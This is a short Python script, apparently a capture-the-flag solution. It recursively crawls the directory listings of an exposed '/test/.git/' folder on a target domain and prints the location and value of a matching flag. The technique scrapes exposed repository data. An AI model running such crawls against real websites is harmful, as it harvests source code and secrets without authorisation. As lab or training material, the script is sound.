import re
import requests
from init import login, domain, flag_pattern


dir_pattern = r'<td><a href="([^"]+)">\1<\/a><\/td>'


def traverse(path):
    response = requests.get(path).text
    if re.search(flag_pattern, response) is not None:
        return re.search(flag_pattern, response).group(0), path

    sub_dirs = re.findall(dir_pattern, response)
    for sub_dir in sub_dirs:
        res = traverse(f"{path}{sub_dir}")
        if res is not None:
            return res
    return None


test_path = f"{domain}test/.git/"
flag, url = traverse(test_path)
print(f"Flag found at {url}")
print(flag)
